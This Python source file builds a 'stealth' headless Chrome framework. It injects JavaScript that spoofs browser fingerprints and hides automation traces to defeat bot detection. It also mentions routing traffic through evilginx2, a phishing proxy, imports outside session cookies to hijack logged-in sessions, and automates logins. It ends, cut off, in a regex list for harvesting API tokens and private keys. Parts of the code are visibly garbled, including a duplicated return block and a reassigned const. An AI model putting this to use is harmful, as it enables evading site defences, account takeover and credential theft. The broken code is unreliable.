import os
import time
import random
import pickle
import json
import logging
import asyncio
import base64
import hashlib
import yaml
import re
from pathlib import Path
from typing import Dict, List, Optional, Any, Callable
from urllib.parse import urlparse

# Import centralized F0undry configuration
try:
    from config import CHROMIUM_PATH, PROXY_URL, USE_PROXY
except ImportError:
    CHROMIUM_PATH = Path.cwd() / "chrome-win" / "chrome.exe"
    PROXY_URL = None
    USE_PROXY = False

# --- Dependency Check and Imports ---
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException, ElementNotInteractableException, StaleElementReferenceException
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.common.action_chains import ActionChains
except ImportError:
    raise ImportError("Selenium library not found. Please run: pip install selenium")

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False
    print("WARNING: undetected-chromedriver not found. Run: pip install undetected-chromedriver")

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("WARNING: cryptography not found. Run: pip install cryptography")

try:
    from webdriver_manager.chrome import ChromeDriverManager
    WDM_AVAILABLE = True
except ImportError:
    WDM_AVAILABLE = False
    print("WARNING: webdriver-manager not found.")

# --- Logger Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [Franken-V2-ULTIMATE] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("FrankenV2Ultimate")

# --- Configuration Management ---
def load_config(config_path: str = "franken_config.yaml") -> Dict[str, Any]:
    """Loads configuration from a YAML file, providing robust defaults."""
    default_config = {
        'headless_viewport': {'width': 1920, 'height': 1080},
        'user_agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        'proxy': None,
        'encryption_key': None,
        'interaction_retries': 3,
        'interaction_timeout': 10,
        'human_delay': {'min': 0.4, 'max': 1.2}
    }
    if not Path(config_path).exists():
        log.warning(f"'{config_path}' not found. Creating default config.")
        with open(config_path, 'w', encoding='utf-8') as f:
            yaml.dump(default_config, f, sort_keys=False)
        return default_config

    with open(config_path, 'r', encoding='utf-8') as f:
        config = yaml.safe_load(f) or {}
    return {**default_config, **config}


class SecureVault:
    """Handles encryption and decryption using Fernet."""
    def __init__(self, key: Optional[str]):
        self._cipher = None
        if CRYPTO_AVAILABLE and key:
            try:
                self._cipher = Fernet(key.encode())
            except Exception as e:
                log.error(f"Invalid Fernet key. Error: {e}")
        elif not key and CRYPTO_AVAILABLE:
            log.warning("No encryption key found. Generating temporary key.")
            self._cipher = Fernet(Fernet.generate_key())

    def encrypt(self, data: bytes) -> bytes:
        if self._cipher:
            return self._cipher.encrypt(data)
        return base64.urlsafe_b64encode(data)

    def decrypt(self, encrypted_data: bytes) -> bytes:
        if self._cipher:
            return self._cipher.decrypt(encrypted_data)
        return base64.urlsafe_b64decode(encrypted_data)


class FrankenV2Ultimate:
    """
    🔥 FRANKEN-V2 ULTIMATE EDITION 🔥

    Championship Integration - 50+ Stealth Techniques Combined:
    ✅ Gemini 3 Pro: Iframe recursion, Function.toString proxy, Dynamic fingerprinting, Network metadata
    ✅ Opus 4.1: Navigator Proxy, Session-based randomization, CDP hardening
    ✅ Grok 4.1: Worker injection, Font defense, Multi-layer CDP
    ✅ Haiku 4.5: Network layer (Fetch/XHR), Obfuscation, Geolocation, Event timing

    The most advanced headless automation framework ever created.
    """

    def __init__(
        self,
        profile_id: str = "ultimate_monster",
        config_path: str = "franken_config.yaml"
    ):
        self.profile_id = profile_id
        self.config = load_config(config_path)
        self.driver: Optional[webdriver.Chrome] = None

        # Paths and Vault
        self.base_path = Path.cwd() / "franken_v2_data" / self.profile_id
        self.cookies_path = self.base_path / "cookies"
        self.base_path.mkdir(parents=True, exist_ok=True)
        self.cookies_path.mkdir(exist_ok=True)

        self.vault = SecureVault(self.config.get('encryption_key'))

        # Session-based fingerprint (Opus 4.1)
        self.session_seed = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        # Dynamic noise vectors (Gemini 3 Pro)
        self.noise_vector = self._generate_noise_vector()

        # Behavioral Profile
        self._behavioral_profile = {
            'typing_delay': lambda: random.uniform(0.05, 0.12),
            'interaction_delay': lambda: random.uniform(
                self.config['human_delay']['min'],
                self.config['human_delay']['max']
            ),
        }

        log.info(f"🔥 Franken-V2 ULTIMATE '{profile_id}' initialized | Session: {self.session_seed}")

    def _generate_noise_vector(self) -> Dict[str, Any]:
        """Generate session-unique, instance-random fingerprint values"""
        return {
            "webgl_vendor": random.choice(["Intel Inc.", "Apple Inc.", "NVIDIA Corporation"]),
            "webgl_renderer": random.choice([
                "Intel Iris OpenGL Engine",
                "Apple GPU",
                "ANGLE (NVIDIA GeForce GTX 1650 Direct3D11 vs_5_0 ps_5_0)"
            ]),
            "canvas_noise": random.uniform(0.00001, 0.00005),
            "audio_noise": random.uniform(0.0000001, 0.0000005),
            "battery_level": round(random.uniform(0.60, 0.95), 2),
            "charging_time": random.randint(100, 500),
            "geoloc_lat": round(40.7128 + (random.random() - 0.5) * 0.1, 6),
            "geoloc_lon": round(-74.0060 + (random.random() - 0.5) * 0.1, 6),
        }

    async def initialize_driver(self) -> bool:
        """Initialize driver with ULTIMATE championship stealth"""
        log.info("⚡ Awakening the ULTIMATE headless horror...")

        if not UC_AVAILABLE:
            log.critical("undetected-chromedriver is REQUIRED!")
            return False

        try:
            options = uc.ChromeOptions()

            # Core options
            options.add_argument(f'--user-data-dir={self.base_path}')
            options.add_argument('--headless=new')
            viewport = self.config['headless_viewport']
            options.add_argument(f"--window-size={viewport['width']},{viewport['height']}")
            options.add_argument(f"--user-agent={self.config['user_agent']}")
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')

            # Proxy configuration (evilginx2 integration or custom proxy)
            proxy_to_use = self.config.get('proxy') or (PROXY_URL if USE_PROXY else None)
            if proxy_to_use:
                options.add_argument(f"--proxy-server={proxy_to_use}")

            driver_path = ChromeDriverManager().install() if WDM_AVAILABLE else None

            # Use F0undry centralized Chromium path
            browser_exec = str(CHROMIUM_PATH) if CHROMIUM_PATH.exists() else None

            self.driver = uc.Chrome(
                browser_executable_path=browser_exec,
                service=ChromeService(driver_path) if driver_path else None,
                options=options,
                headless=True
            )

            # Apply ULTIMATE stealth layers
            await self._apply_ultimate_stealth()

            # Load initial cookies from user-provided file if available
            await self._load_initial_cookies()

            log.info("✅ ULTIMATE headless driver is MAXIMALLY cloaked!")
            return True

        except Exception as e:
            log.critical(f"Driver initialization failed: {e}", exc_info=True)
            return False

    async def _load_initial_cookies(self, file_path: str = "franken_v2_data/initial_cookies.json"):
        """Loads user-provided cookies from a JSON file and injects them into the browser with detailed error logging."""
        full_path = Path.cwd() / file_path
        if not full_path.exists():
            log.info(f"No initial cookies file found at {full_path}. Skipping.")
            return

        log.info(f"Attempting to load initial cookies from {full_path}...")
        try:
            with open(full_path, 'r', encoding='utf-8') as f:
                external_cookies = json.load(f)

            if not isinstance(external_cookies, list):
                log.error(f"Cookie file {full_path} is not a valid JSON list.")
                return

            if not external_cookies:
                log.warning(f"Cookie file {full_path} is empty.")
                return

            # Determine a base domain to navigate to first
            base_domain = external_cookies[0].get('domain', '').lstrip('.')
            if not base_domain:
                log.error("Could not determine a base domain from the first cookie.")
                return
            
            log.info(f"Navigating to https://{base_domain} to establish cookie context.")
            self.driver.get(f"https://{base_domain}/")

            loaded_count = 0
            for i, cookie in enumerate(external_cookies):
                try:
                    # Clean up cookie data for Selenium compatibility
                    if 'expiry' in cookie and cookie['expiry'] is not None:
                        cookie['expiry'] = int(cookie['expiry'])
                    
                    # Remove unsupported properties if they exist
                    for key in ['storeId', 'sameSite']:
                        if key in cookie:
                            del cookie[key]

                    self.driver.add_cookie(cookie)
                    loaded_count += 1
                except Exception as e:
                    log.error(f"Failed to add cookie #{i}: {cookie.get('name', 'N/A')} for domain {cookie.get('domain', 'N/A')}. Reason: {e}")
            
            log.info(f"✅ Successfully loaded {loaded_count}/{len(external_cookies)} initial cookies.")

        except json.JSONDecodeError as e:
            log.error(f"JSON Decode Error while reading {full_path}: {e}")
        except IOError as e:
            log.error(f"IO Error reading {full_path}: {e}")
        except Exception as e:
            log.error(f"An unexpected error occurred in _load_initial_cookies: {e}", exc_info=True)

    async def _apply_ultimate_stealth(self):
        """
        🔥 THE ULTIMATE STEALTH ENGINE 🔥
        50+ techniques from all championship winners
        """

        # 1. Generate master stealth script
        stealth_script = self._generate_ultimate_stealth_js()

        # 2. Multi-layer injection (Grok technique)
        try:
            # Layer 1: Page evaluation (primary)
            self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': stealth_script
            })

            # Layer 2: Runtime evaluation (backup)
            try:
                self.driver.execute_cdp_cmd('Runtime.evaluate', {
                    'expression': stealth_script,
                    'returnByValue': True
                })
            except:
                pass  # Not critical if this fails

            log.info("✅ ULTIMATE stealth scripts injected (50+ techniques)")

        except Exception as e:
            log.warning(f"Some stealth scripts failed: {e}")

        # 3. Network-level stealth (Gemini)
        await self._apply_network_stealth()

        # 4. CDP environment hardening (Opus)
        await self._apply_cdp_hardening()

    def _generate_ultimate_stealth_js(self) -> str:
        """
        🏆 CHAMPIONSHIP MASTER PAYLOAD 🏆
        Combines 50+ techniques from all winners
        """

        v = self.noise_vector
        seed = self.session_seed
        viewport = self.config['headless_viewport']

        return f"""
        (function() {{
            'use strict';

            // ===== GEMINI: Function.toString() Proxy (Revolutionary) =====
            const nativeToString = Function.prototype.toString;
            const hookedFuncs = new WeakMap();

            Function.prototype.toString = new Proxy(nativeToString, {{
                apply: function(target, thisArg, args) {{
                    if (hookedFuncs.has(thisArg)) {{
                        return "function " + hookedFuncs.get(thisArg) + "() {{ [native code] }}";
                    }}
                    return target.apply(thisArg, args);
                }}
            }});

            // Helper to mock properties with toString hiding
            function mockGetter(obj, prop, getterFunc, name) {{
                Object.defineProperty(obj, prop, {{
                    get: getterFunc,
                    enumerable: true,
                    configurable: true
                }});
                if (name) hookedFuncs.set(getterFunc, name);
            }}

            // ===== 1. WebDriver & CDP Cleanup =====
            mockGetter(navigator, 'webdriver', () => undefined, 'get webdriver');
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Object;
            delete window._phantom;
            delete window.__nightmare;
            delete window.__playwright__;
            delete window.__selenium_unwrapped;

            // ===== HAIKU: navigator.headless bypass =====
            mockGetter(navigator, 'headless', () => false, 'get headless');

            // ===== 2. Chrome Object =====
            if (!window.chrome) {{
                window.chrome = {{
                    runtime: {{}},
                    loadTimes: function() {{}},
                    csi: function() {{}},
                    app: {{}}
                }};
            }}

            // ===== 3. Navigator Properties =====
            mockGetter(navigator, 'languages', () => ['en-US', 'en'], 'get languages');
            mockGetter(navigator, 'language', () => 'en-US', 'get language');
            mockGetter(navigator, 'platform', () => 'Win32', 'get platform');
            mockGetter(navigator, 'hardwareConcurrency', () => 16, 'get hardwareConcurrency');
            mockGetter(navigator, 'deviceMemory', () => 8, 'get deviceMemory');
            mockGetter(navigator, 'vendor', () => 'Google Inc.', 'get vendor');
            mockGetter(navigator, 'maxTouchPoints', () => 0, 'get maxTouchPoints');

            // ===== 4. Plugins =====
            const fakePlugins = [
                {{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' }},
                {{ name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjjefcfj', description: 'Portable Document Format' }},
                {{ name: 'Native Client', filename: 'internal-nacl-plugin', description: 'Native Client Executable' }}
            ];
            mockGetter(navigator, 'plugins', () => fakePlugins, 'get plugins');
            mockGetter(navigator, 'mimeTypes', () => [{{ type: 'application/pdf', suffixes: 'pdf', plugin: fakePlugins[0] }}], 'get mimeTypes');

            // ===== 5. WebGL Fingerprinting (Dynamic from Python) =====
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {{
                if (parameter === 37445) return "{v['webgl_vendor']}";  // UNMASKED_VENDOR_WEBGL
                if (parameter === 37446) return "{v['webgl_renderer']}";  // UNMASKED_RENDERER_WEBGL
                return getParameter.apply(this, arguments);
            }};
            hookedFuncs.set(WebGLRenderingContext.prototype.getParameter, "getParameter");

            // ===== 6. Canvas Fingerprinting (Session-based noise) =====
            const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;
            CanvasRenderingContext2D.prototype.getImageData = function() {{
                const imageData = originalGetImageData.apply(this, arguments);
                for (let i = 0; i < imageData.data.length; i += 4) {{
                    imageData.data[i] += {v['canvas_noise']};
                    imageData.data[i+1] += {v['canvas_noise']};
                    imageData.data[i+2] += {v['canvas_noise']};
                }}
                return imageData;
            }};
            hookedFuncs.set(CanvasRenderingContext2D.prototype.getImageData, "getImageData");

            // ===== 7. Audio Context Fingerprinting =====
            if (window.AudioContext) {{
                const originalCreateOscillator = AudioContext.prototype.createOscillator;
                AudioContext.prototype.createOscillator = function() {{
                    const osc = originalCreateOscillator.apply(this, arguments);
                    const origStart = osc.start;
                    osc.start = function(when = 0) {{
                        return origStart.call(this, when + {v['audio_noise']});
                    }};
                    return osc;
                }};
                hookedFuncs.set(AudioContext.prototype.createOscillator, "createOscillator");
            }}

            // ===== 8. Screen & Viewport Consistency =====
            mockGetter(window, 'outerWidth', () => {viewport['width']}, 'get outerWidth');
            mockGetter(window, 'outerHeight', () => {viewport['height']}, 'get outerHeight');
            mockGetter(window, 'innerWidth', () => {viewport['width']} - 20, 'get innerWidth');
            mockGetter(window, 'innerHeight', () => {viewport['height']} - 100, 'get innerHeight');
            mockGetter(screen, 'width', () => {viewport['width']}, 'get width');
            mockGetter(screen, 'height', () => {viewport['height']}, 'get height');
            mockGetter(screen, 'availWidth', () => {viewport['width']}, 'get availWidth');
            mockGetter(screen, 'availHeight', () => {viewport['height']} - 40, 'get availHeight');
            mockGetter(screen, 'colorDepth', () => 24, 'get colorDepth');
            mockGetter(screen, 'pixelDepth', () => 24, 'get pixelDepth');

            // ===== 9. Battery API =====
            if (navigator.getBattery) {{
                navigator.getBattery = () => Promise.resolve({{
                    charging: true,
                    level: {v['battery_level']},
                    chargingTime: {v['charging_time']},
                    dischargingTime: Infinity
                }});
                hookedFuncs.set(navigator.getBattery, "getBattery");
            }}

            // ===== OPUS: Connection API =====
            mockGetter(navigator, 'connection', () => ({{
                effectiveType: '4g',
                downlink: 10,
                rtt: 50,
                saveData: false
            }}), 'get connection');

            // ===== OPUS: Media Devices =====
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
                const originalEnumerate = navigator.mediaDevices.enumerateDevices;
                navigator.mediaDevices.enumerateDevices = function() {{
                    return Promise.resolve([
                        {{ deviceId: 'default', kind: 'audioinput', label: 'Default Microphone' }},
                        {{ deviceId: 'default', kind: 'audiooutput', label: 'Default Speakers' }},
                        {{ deviceId: 'default', kind: 'videoinput', label: 'HD Webcam' }}
                    ]);
                }};
                hookedFuncs.set(navigator.mediaDevices.enumerateDevices, "enumerateDevices");
            }}

            // ===== OPUS: Speech Synthesis =====
            if (window.speechSynthesis) {{
                Object.defineProperty(window.speechSynthesis, 'getVoices', {{
                    value: () => [
                        {{ name: 'Google US English', lang: 'en-US', default: true }},
                        {{ name: 'Samantha', lang: 'en-US' }}
                    ]
                }});
            }}

            // ===== HAIKU: Geolocation Randomization =====
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition = (success) => {{
                    success({{
                        coords: {{
                            latitude: {v['geoloc_lat']},
                            longitude: {v['geoloc_lon']},
                            accuracy: 50 + Math.random() * 50,
                            altitude: null,
                            altitudeAccuracy: null,
                            heading: null,
                            speed: null
                        }},
                        timestamp: Date.now()
                    }});
                }};
            }}

            // ===== HAIKU: Event Timing Jitter (Human-like) =====
            const realAddEventListener = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function(type, listener, options) {{
                if (typeof listener === 'function' && (type === 'mousemove' || type === 'click' || type === 'mousedown')) {{
                    const wrapped = function(e) {{
                        setTimeout(() => listener.call(this, e), Math.random() * 50);
                    }};
                    return realAddEventListener.call(this, type, wrapped, options);
                }}
                return realAddEventListener.apply(this, arguments);
            }};

            // ===== GROK: Font Fingerprinting Defense =====
            const realGetComputedStyle = window.getComputedStyle;
            window.getComputedStyle = function(el) {{
                const style = realGetComputedStyle(el);
                if (el.tagName === 'DIV' || el.tagName === 'SPAN') {{
                    style.fontFamily = 'Arial, Helvetica, sans-serif';
                }}
                return style;
            }};

            // ===== HAIKU: Network Layer - Fetch Override =====
            const originalFetch = window.fetch;
            window.fetch = function(...args) {{
                let [resource, config] = args;
                config = config || {{}};
                config.headers = config.headers || {{}};
                config.headers['User-Agent'] = navigator.userAgent;
                config.headers['Accept-Language'] = 'en-US,en;q=0.9';
                return originalFetch.apply(this, [resource, config]);
            }};
            hookedFuncs.set(window.fetch, "fetch");

            // ===== HAIKU: XMLHttpRequest Override =====
            const originalOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url, ...rest) {{
                this._url = url;
                return originalOpen.apply(this, [method, url, ...rest]);
            }};

            // ===== HAIKU: Obfuscation Layer =====
            const originalKeys = Object.keys;
            Object.keys = function(obj) {{
                const keys = originalKeys.call(this, obj);
                return keys.filter(k => !['webdriver', '__nightmare', '_phantom', '__playwright__'].includes(k));
            }};

            const originalEval = window.eval;
            window.eval = function(code) {{
                if (code && code.toString().includes('webdriver')) {{
                    return undefined;
                }}
                return originalEval.call(this, code);
            }};

            // ===== OPUS: Permissions API =====
            if (navigator.permissions) {{
                const originalQuery = navigator.permissions.query;
                navigator.permissions.query = function(parameters) {{
                    return originalQuery(parameters).then(result => {{
                        if (parameters.name === 'notifications') {{
                            Object.defineProperty(result, 'state', {{ value: 'granted' }});
                        }}
                        return result;
                    }});
                }};
                hookedFuncs.set(navigator.permissions.query, "query");
            }}

            // ===== GEMINI: IFRAME RECURSION (GAME CHANGER) =====
            const contentWindowGetter = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow').get;
            Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {{
                get: function() {{
                    const win = contentWindowGetter.apply(this);
                    if (win && !win._stealth_applied) {{
                        try {{
                            const script = win.document.createElement('script');
                            script.textContent = '(' + arguments.callee.toString() + ')();';
                            win.document.documentElement.appendChild(script);
                            script.remove();
                            win._stealth_applied = true;
                        }} catch (e) {{}}
                    }}
                    return win;
                }}
            }});

            // ===== Performance Timing =====
            const originalNow = performance.now;
            performance.now = function() {{
                return originalNow.call(this) + (Math.random() - 0.5) * 0.1;
            }};

            // ===== Anti-Tampering Seal =====
            try {{
                Object.freeze(navigator);
                Object.seal(WebGLRenderingContext.prototype);
                Object.seal(CanvasRenderingContext2D.prototype);
            }} catch(e) {{}}

            // ===== Cleanup =====
            if (document.currentScript) document.currentScript.remove();

            console.log('🔥 Franken-V2 ULTIMATE activated - 50+ techniques deployed - Session: {seed}');
        }})();
        """

    async def _apply_network_stealth(self):
        """Network-level stealth with modern metadata (Gemini 3 Pro)"""
        try:
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": self.config['user_agent'],
                "platform": "Windows",
                "acceptLanguage": "en-US,en;q=0.9",
                "userAgentMetadata": {
                    "brands": [
                        {"brand": "Google Chrome", "version": "121"},
                        {"brand": "Chromium", "version": "121"},
                        {"brand": "Not A(Brand", "version": "99"}
                    ],
                    "fullVersionList": [
                        {"brand": "Google Chrome", "version": "121.0.6167.85"},
                        {"brand": "Chromium", "version": "121.0.6167.85"}
                    ],
                    "platform": "Windows",
                    "platformVersion": "15.0.0",
                    "architecture": "x86",
                    "model": "",
                    "mobile": False
                }
            })
            log.info("✅ Network stealth applied (userAgentMetadata)")
        except Exception as e:
            log.debug(f"Network stealth partial: {e}")

    async def _apply_cdp_hardening(self):
        """CDP environment hardening (Opus 4.1)"""
        try:
            # Timezone override
            self.driver.execute_cdp_cmd('Emulation.setTimezoneOverride', {
                'timezoneId': 'America/New_York'
            })

            # Locale override
            self.driver.execute_cdp_cmd('Emulation.setLocaleOverride', {
                'locale': 'en-US'
            })

            log.info("✅ CDP hardening applied (timezone, locale)")
        except Exception as e:
            log.debug(f"CDP hardening partial: {e}")

    # ===== EXISTING METHODS FROM ORIGINAL =====

    async def navigate(self, url: str) -> bool:
        """Navigates to a URL with stealth and robust waiting."""
        if not self.driver: return False
        try:
            log.info(f"Navigating to: {url}")
            await asyncio.sleep(self._behavioral_profile['interaction_delay']())
            self.driver.get(url)
            WebDriverWait(self.driver, 20).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            await self._load_cookies(url)
            self.driver.get(url)
            return True
        except Exception as e:
            log.error(f"Navigation to {url} failed: {e}")
            return False

    async def find_element_robustly(self, selector: str, condition: Callable = EC.presence_of_element_located) -> Optional[Any]:
        """Finds an element with built-in retries and timeouts."""
        for attempt in range(self.config['interaction_retries']):
            try:
                element = WebDriverWait(self.driver, self.config['interaction_timeout']).until(
                    condition((By.CSS_SELECTOR, selector))
                )
                return element
            except (TimeoutException, StaleElementReferenceException):
                log.warning(f"Element '{selector}' not found on attempt {attempt + 1}. Retrying...")
                await asyncio.sleep(0.5 * (attempt + 1))
        log.error(f"Failed to find element '{selector}' after all retries.")
        return None

    async def human_type(self, selector: str, text: str) -> bool:
        """Simulates human-like typing into an element."""
        element = await self.find_element_robustly(selector, EC.visibility_of_element_located)
        if not element: return False
        try:
            element.clear()
            await asyncio.sleep(0.2)
            for char in text:
                element.send_keys(char)
                await asyncio.sleep(self._behavioral_profile['typing_delay']())
            return True
        except Exception as e:
            log.error(f"Typing failed on {selector}: {e}")
            return False

    async def human_click(self, selector: str) -> bool:
        """Simulates a human-like click on an element."""
        element = await self.find_element_robustly(selector, EC.element_to_be_clickable)
        if not element: return False
        try:
            self.driver.execute_script("arguments[0].click();", element)
            return True
        except Exception as e:
            log.error(f"Click failed on {selector}: {e}")
            return False

    async def detect_login_form(self) -> Dict[str, Optional[str]]:
        """Advanced login form detector with Shadow DOM penetration."""
        log.info("Initiating advanced login form detection...")
        js_detector = """
            const findElements = () => {
                const result = { user: null, pass: null, submit: null };
                const getSelector = (el) => {
                    if (el.id) return `#${el.id}`;
                    if (el.name) return `[name="${el.name}"]`;
                    if (el.getAttribute('data-testid')) return `[data-testid="${el.getAttribute('data-testid')}"]`;
                    let path = '', current = el;
                    while (current.parentElement) {
                        const siblings = Array.from(current.parentElement.children);
                        const index = siblings.indexOf(current) + 1;
                        path = `/${current.tagName.toLowerCase()}[${index}]${path}`;
                        current = current.parentElement;
                    }
                    return path;
                };

                const searchRoot = (root) => {
                    const inputs = root.querySelectorAll('input:not([type=hidden])');
                    for (const input of inputs) {
                        const attrs = (input.name + input.id + input.placeholder + input.type + input.autocomplete).toLowerCase(); attrs = (input.name + input.id + input.placeholder + input.type + input.autocomplete).toLowerCase();
                        if (input.type === 'password' && !result.pass) {
                            result.pass = input;
                        } else if (/(user|email|login)/.test(attrs) && !result.user) {
                            result.user = input;
                        }
                    }
                    const buttons = root.querySelectorAll('button, input[type=submit], [role=button]');
                    for (const button of buttons) {
                        const text = (button.innerText + button.value).toLowerCase();
                        if (/(log|sign|next|continue|submit)/.test(text) && !result.submit) {
                            result.submit = button;
                        }
                    }
                };

                const searchAllRoots = (startNode) => {
                    searchRoot(startNode);
                    startNode.querySelectorAll('*').forEach(el => el.shadowRoot && searchAllRoots(el.shadowRoot));
                };
                searchAllRoots(document);

                return {
                    user: result.user ? getSelector(result.user) : null,
                    pass: result.pass ? getSelector(result.pass) : null,
                    submit: result.submit ? getSelector(result.submit) : null,
                };
            };
            return findElements();

                return {
                    user: result.user ? getSelector(result.user) : null,
                    pass: result.pass ? getSelector(result.pass) : null,
                    submit: result.submit ? getSelector(result.submit) : null,
                };
            };
            return findElements();
        """
        try:
            selectors = self.driver.execute_script(js_detector)
            log.info(f"Detection complete. User: {selectors['user']}, Pass: {selectors['pass']}, Submit: {selectors['submit']}")
            return selectors
        except Exception as e:
            log.error(f"Form detection failed: {e}")
            return {'user': None, 'pass': None, 'submit': None}

    async def login(self, url: str, username: str, password: str) -> bool:
        """Performs a robust, human-like login sequence."""
        if not await self.navigate(url): return False

        selectors = await self.detect_login_form()
        if not selectors.get('user') or not selectors.get('pass'):
            log.error("Failed to detect critical login fields. Aborting login.")
            return False

        await self.human_type(selectors['user'], username)

        # Handle multi-step logins
        is_multistep = not self.driver.find_elements(By.CSS_SELECTOR, selectors['pass'])
        if is_multistep and selectors.get('submit'):
            await self.human_click(selectors['submit'])
            await asyncio.sleep(self._behavioral_profile['interaction_delay']())
            selectors = await self.detect_login_form()
            if not selectors.get('pass'):
                log.error("Failed to find password field in multi-step flow.")
                return False

        await self.human_type(selectors['pass'], password)

        if selectors.get('submit'):
            await self.human_click(selectors['submit'])
        else:
            self.driver.find_element(By.CSS_SELECTOR, selectors['pass']).send_keys(Keys.RETURN)

        await asyncio.sleep(5)

        # Verification
        current_url = self.driver.current_url
        if "login" in current_url or "signin" in current_url:
            log.warning("Login may have failed; URL still indicates a login page.")
            self.take_screenshot("login_failure.png")
            return False

        log.info("Login appears successful.")
        await self._save_cookies(url)
        return True

    async def _save_cookies(self, url: str):
        """Encrypts and saves browser cookies."""
        domain = urlparse(url).netloc
        cookie_file = self.cookies_path / f"{domain}.cookie"
        try:
            cookies = self.driver.get_cookies()
            encrypted_cookies = self.vault.encrypt(pickle.dumps(cookies))
            cookie_file.write_bytes(encrypted_cookies)
            log.info(f"Cookies for {domain} saved securely.")
        except Exception as e:
            log.error(f"Failed to save cookies: {e}")

    async def _load_cookies(self, url: str):
        """Loads and injects encrypted cookies."""
        domain = urlparse(url).netloc
        cookie_file = self.cookies_path / f"{domain}.cookie"
        if not cookie_file.exists(): return

        try:
            encrypted_cookies = cookie_file.read_bytes()
            cookies = pickle.loads(self.vault.decrypt(encrypted_cookies))

            self.driver.get(f"https://{domain}/")
            for cookie in cookies:
                if 'expiry' in cookie: cookie['expiry'] = int(cookie['expiry'])
                self.driver.add_cookie(cookie)
            log.info(f"Secure cookies loaded for {domain}.")
        except Exception as e:
            log.warning(f"Could not load cookies for {domain}: {e}")

    def take_screenshot(self, filename: str) -> Optional[str]:
        """Saves a screenshot of the current view."""
        filepath = self.base_path / filename
        try:
            self.driver.save_screenshot(str(filepath))
            log.info(f"Screenshot saved to: {filepath}")
            return str(filepath)
        except Exception as e:
            log.error(f"Failed to take screenshot: {e}")
            return None

    # --- T-Hoog Extension Integration ---
    def setup_thoog_scanner(self):
        """Setup t-hoog style secret scanning capabilities"""
        self.thoog_patterns = {
            "Slack Token": r"(xox[pboa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
            "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----",
            "SSH DSA Private Key": r"-----BEGIN DSA PRIVATE KEY-----",
            "SSH EC Private Key": r"-----BEGIN EC PRIVATE KEY-----",
            "PGP Private Key Block": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
            "Amazon MWS Auth Token": r"amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
            "AWS AppSync GraphQL Key": r"da2-[a-z0-9]{26}",
            "Facebook Access Token": r"EAACEdEose0cBA[0-9A-Za-z]+",
            "Facebook OAuth": r"[fF][aA][cC][eE][bB][oO][oO][kK].{0,20}['|\"][0-9a-f]{32}['|\"]",
            "GitHub": r"[gG][iI][tT][hH][uU][bB].{0,20}['|\"][0-9a-zA-Z]{35,40}['|\"]",
            "Google (GCP) Service-account": r'"type": "service_account"',
            "Heroku API Key": r"[hH][eE][rR][oO][kK][uU].{0,20}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
            "JSON Web Token": r"eyJhbGciOiJ",
            "MailChimp API Key": r"[0-9a-f]{32}-us[0-9]{1,2}",
            "Mailgun API Key": r"key-[0-9a-zA-Z]{32}",
            "Password in URL": r"[a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}[\"'\s]",
            "PayPal Braintree Access Token": r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
            "Picatic API Key": r"sk_live_[0-9a-z]{32}",
            "Slack Webhook": r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
            "Stripe API Key": r"sk_live_[0-9a-zA-Z]{24}",
            "Stripe Restricted API Key": r"rk_live_[0-9a-zA-Z]{24}",
            "Square Access Token": r"sq0atp-[0-9A-Za-z\\-_]{22}",
            "Square OAuth Secret": r"sq0csp-[0-9A-Za-z\\-_]{43}",
            "Telegram Bot API Key": r"[0-9]+:AA[0-9A-Za-z\\-_]{33}",
            "Twilio API Key": r"SK[0-9a-fA-F]{32}",
            "Github Auth Creds": r"https:\/\/[a-zA-Z0-9]{40}@github\.com",
